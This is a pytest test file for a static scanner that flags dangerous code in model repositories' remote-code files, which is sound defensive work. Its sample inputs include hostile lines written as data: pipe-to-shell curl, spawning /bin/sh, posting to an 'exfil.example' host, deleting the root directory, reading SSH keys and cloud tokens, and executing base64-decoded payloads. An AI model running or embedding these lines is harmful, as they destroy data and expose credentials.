"""Tests for cyberjection.hubguard.remotecode (static only -- nothing runs)."""

from __future__ import annotations

import textwrap

import pytest

from cyberjection.hubguard.models import FindingCategory, Severity
from cyberjection.hubguard.remotecode import (
    analyze_auto_map,
    analyze_python_source,
    parse_auto_map,
)


def analyze(source: str):  # type: ignore[no-untyped-def]
    return analyze_python_source(textwrap.dedent(source), filename="modeling_test.py")


def rule_ids(source: str) -> set:
    return {f.rule_id for f in analyze(source).findings}


def worst(source: str) -> Severity:
    return max((f.severity for f in analyze(source).findings), key=lambda s: s.rank, default=Severity.INFO)


BENIGN_MODELING = '''
import math
import torch
from torch import nn
from transformers import PreTrainedModel
from .configuration_tiny import TinyConfig

logger = __import__("logging").getLogger(__name__)


class TinyModel(PreTrainedModel):
    config_class = TinyConfig

    def __init__(self, config):
        super().__init__(config)
        self.linear = nn.Linear(config.hidden_size, config.hidden_size)
        self.scale = 1.0 / math.sqrt(config.hidden_size)

    def forward(self, x):
        return self.linear(x) * self.scale
'''


class TestBenign:
    def test_ordinary_modeling_file_has_no_significant_findings(self) -> None:
        analysis = analyze(BENIGN_MODELING)
        assert analysis.parse_error is None
        assert not [f for f in analysis.findings if f.severity.rank >= Severity.LOW.rank]
        assert "torch" in analysis.imports

    def test_safe_torch_load_is_not_flagged(self) -> None:
        assert "remote_code.deserialization" not in rule_ids("import torch\ndef f(p):\n    return torch.load(p, weights_only=True)\n")

    def test_safe_yaml_load_is_not_flagged(self) -> None:
        assert not rule_ids("import yaml\ndef f(s):\n    return yaml.load(s, Loader=yaml.SafeLoader)\n")


class TestProcessExecution:
    @pytest.mark.parametrize(
        "source",
        [
            "import os\nos.system('curl x | sh')",
            "import subprocess\nsubprocess.run(['id'])",
            "import subprocess as sp\nsp.Popen('id', shell=True)",
            "from subprocess import check_output as co\nco(['id'])",
            "from os import system\nsystem('id')",
            "__import__('os').system('id')",
            "import importlib\nimportlib.import_module('subprocess').call(['id'])",
            "import os\ngetattr(os, 'system')('id')",
            "import os\nos.execv('/bin/sh', ['sh'])",
            "import pty\npty.spawn('/bin/sh')",
        ],
    )
    def test_detected_and_critical(self, source: str) -> None:
        assert "remote_code.process_execution" in rule_ids(source)
        assert worst(source) == Severity.CRITICAL

    def test_module_level_call_is_annotated(self) -> None:
        finding = next(f for f in analyze("import os\nos.system('id')").findings if f.rule_id == "remote_code.process_execution")
        assert "module level" in finding.description
        assert finding.line == 2
        assert finding.evidence == "os.system('id')"

    def test_call_inside_function_is_not_marked_module_level(self) -> None:
        finding = next(f for f in analyze("import os\ndef f():\n    os.system('id')\n").findings if f.rule_id == "remote_code.process_execution")
        assert "module level" not in finding.description

    def test_class_body_counts_as_import_time(self) -> None:
        finding = next(
            f for f in analyze("import requests\nclass M:\n    data = requests.get('http://x.example')\n").findings if f.rule_id == "remote_code.network"
        )
        assert "module level" in finding.description
        assert finding.severity == Severity.CRITICAL  # HIGH bumped for import-time execution


class TestOtherCategories:
    @pytest.mark.parametrize(
        "source,rule",
        [
            ("import socket\ndef f():\n    socket.socket().connect(('1.2.3.4', 1))", "remote_code.network"),
            ("import requests\ndef f():\n    requests.post('https://exfil.example', data=1)", "remote_code.network"),
            ("import urllib.request\ndef f():\n    urllib.request.urlopen('http://x')", "remote_code.network"),
            ("import shutil\ndef f():\n    shutil.rmtree('/')", "remote_code.filesystem_tamper"),
            ("import os\ndef f():\n    os.remove('x')", "remote_code.filesystem_tamper"),
            ("import ctypes\ndef f():\n    ctypes.CDLL('libc.so.6')", "remote_code.native_code"),
            ("import pickle\ndef f(b):\n    return pickle.loads(b)", "remote_code.deserialization"),
            ("import torch\ndef f(p):\n    return torch.load(p)", "remote_code.deserialization"),
            ("import numpy as np\ndef f(p):\n    return np.load(p, allow_pickle=True)", "remote_code.deserialization"),
            ("import yaml\ndef f(s):\n    return yaml.load(s)", "remote_code.deserialization"),
            ("import sys\ndef f():\n    sys.settrace(None)", "remote_code.anti_analysis"),
            ("def f(m):\n    return __import__(m)", "remote_code.dynamic_import"),
            ("import os\ndef f(n):\n    return getattr(os, n)", "remote_code.dynamic_attribute"),
            ("import torch\ntorch.load = lambda *a, **k: None", "remote_code.monkeypatch"),
            ("from os import *", "remote_code.star_import"),
            ("def f():\n    open('/tmp/x', 'w').write('1')", "remote_code.filesystem_write"),
            ("import torch.hub\ndef f():\n    torch.hub.load('a/b', 'm')", "remote_code.runtime_download"),
            ("from huggingface_hub import hf_hub_download\ndef f():\n    hf_hub_download('a/b', 'x.bin')", "remote_code.runtime_download"),
        ],
    )
    def test_rule(self, source: str, rule: str) -> None:
        assert rule in rule_ids(source)

    def test_credential_file_read_is_critical(self) -> None:
        source = "import os\ndef f():\n    return open(os.path.expanduser('~/.ssh/id_rsa')).read()"
        assert "remote_code.credential_access" in rule_ids(source)
        assert worst(source) == Severity.CRITICAL

    def test_credential_env_read(self) -> None:
        assert "remote_code.credential_access" in rule_ids("import os\ndef f():\n    return os.environ['HF_TOKEN']")
        assert "remote_code.credential_access" in rule_ids("import os\ndef f():\n    return os.getenv('AWS_SECRET_ACCESS_KEY')")
        assert "remote_code.credential_access" not in rule_ids("import os\ndef f():\n    return os.getenv('LOCAL_RANK')")


class TestObfuscation:
    def test_exec_of_base64_is_critical(self) -> None:
        source = "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))"
        assert "remote_code.obfuscated_execution" in rule_ids(source)
        assert worst(source) == Severity.CRITICAL

    def test_exec_of_zlib_inside_function(self) -> None:
        source = "import zlib, base64\ndef f(blob):\n    exec(zlib.decompress(base64.b64decode(blob)))"
        assert "remote_code.obfuscated_execution" in rule_ids(source)

    def test_exec_of_chr_join(self) -> None:
        source = "def f():\n    eval(''.join(chr(c) for c in [111, 115]))"
        assert "remote_code.obfuscated_execution" in rule_ids(source)

    def test_high_entropy_blob(self) -> None:
        import base64
        import os as _os

        blob = base64.b64encode(_os.urandom(400)).decode()
        assert "remote_code.encoded_blob" in rule_ids(f"PAYLOAD = '{blob}'\n")

    def test_external_url_reference(self) -> None:
        assert "remote_code.external_url" in rule_ids("URL = 'http://203.0.113.5/payload'\n")
        assert "remote_code.external_url" not in rule_ids("URL = 'https://huggingface.co/docs'\n")


class TestParseFailures:
    def test_syntax_error_fails_closed(self) -> None:
        analysis = analyze("def broken(:\n    pass")
        assert analysis.parse_error
        assert analysis.findings[-1].rule_id == "remote_code.unparseable"
        assert analysis.findings[-1].severity == Severity.HIGH

    def test_nul_bytes_fail_closed(self) -> None:
        assert analyze_python_source("x = 1\x00", filename="m.py").parse_error


class TestAutoMap:
    CONFIG = """{
        "model_type": "tiny",
        "auto_map": {
            "AutoConfig": "configuration_tiny.TinyConfig",
            "AutoModel": "modeling_tiny.TinyModel",
            "AutoModelForCausalLM": "evil-org/payloads--modeling_evil.EvilModel",
            "AutoTokenizer": ["tokenization_tiny.TinyTokenizer", null]
        }
    }"""

    def test_parse(self) -> None:
        entries = parse_auto_map(self.CONFIG, source_file="config.json")
        assert {e.module for e in entries} == {"configuration_tiny", "modeling_tiny", "modeling_evil", "tokenization_tiny"}
        external = [e for e in entries if e.external_repo]
        assert external[0].external_repo == "evil-org/payloads"

    def test_findings_when_blocking(self) -> None:
        entries = parse_auto_map(self.CONFIG, source_file="config.json")
        findings = analyze_auto_map(entries, {"configuration_tiny.py", "modeling_tiny.py"}, block_remote_code=True)
        ids = {f.rule_id for f in findings}
        assert {"remote_code.required", "remote_code.cross_repo", "remote_code.missing_module"} <= ids
        required = next(f for f in findings if f.rule_id == "remote_code.required")
        assert required.blocking and required.category == FindingCategory.POLICY

    def test_required_is_informational_when_allowed(self) -> None:
        entries = parse_auto_map(self.CONFIG, source_file="config.json")
        required = next(f for f in analyze_auto_map(entries, set(), block_remote_code=False) if f.rule_id == "remote_code.required")
        assert not required.blocking and required.severity == Severity.LOW

    def test_no_auto_map(self) -> None:
        assert parse_auto_map('{"model_type": "llama"}', source_file="config.json") == []
        assert parse_auto_map("not json", source_file="config.json") == []
        assert analyze_auto_map([], set(), block_remote_code=True) == []


class TestNestedPayloads:
    def test_exec_of_constant_is_analyzed_recursively(self) -> None:
        # The payload shape of the public "totally-harmless-model" demo.
        source = "exec('''import webbrowser\nwebbrowser.open(\"https://example.invalid\")\nimport sys\ndel sys.modules['webbrowser']\n''')"
        findings = analyze(source).findings
        described = " ".join(f.description for f in findings)
        assert "Inside `exec` payload: Calls `webbrowser.open`" in described
        assert any(f.rule_id == "remote_code.anti_analysis" and "sys.modules" in f.description for f in findings)
        assert all(f.line == 1 for f in findings)

    def test_doubly_nested_payload(self) -> None:
        source = "eval(\"exec('import os; os.system(1)')\")"
        assert worst(source) == Severity.CRITICAL
